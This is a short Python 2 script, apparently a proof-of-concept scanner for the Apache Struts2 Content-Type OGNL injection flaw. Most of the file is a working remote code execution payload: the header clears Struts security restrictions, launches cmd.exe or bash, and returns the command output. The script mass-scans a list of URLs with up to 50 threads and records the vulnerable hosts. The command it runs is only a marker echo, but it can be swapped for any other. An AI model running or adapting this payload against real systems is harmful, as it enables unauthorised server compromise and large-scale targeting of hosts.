#coding:utf-8

import urllib2
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
import threading
def poc(url):
	register_openers()
	datagen, header = multipart_encode({"image1": open("tmp.txt", "rb")})
	header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
	header["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo 8thswordman').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
	try:
	    request = urllib2.Request(url,datagen,headers=header)
	    response = urllib2.urlopen(request,timeout=5)
	    body=response.read()
	except:
		body=""
	if "8thswordman" in body:
		print "[Loopholes exist]",url
		f.write(url+"\n")
	else:
		print "Loopholes not exist",url
if __name__=="__main__":
	'''
	url.txt为待检测url列表
	result.txt为检测完输出结果文件
	'''
	f=open("result.txt","a")
	url_list=[i.replace("\n","") for i in open("url.txt","r").readlines()]
	for url in url_list:
		threading.Thread(target=poc,args=(url,)).start()
		while 1:
			if(len(threading.enumerate())<50):
				break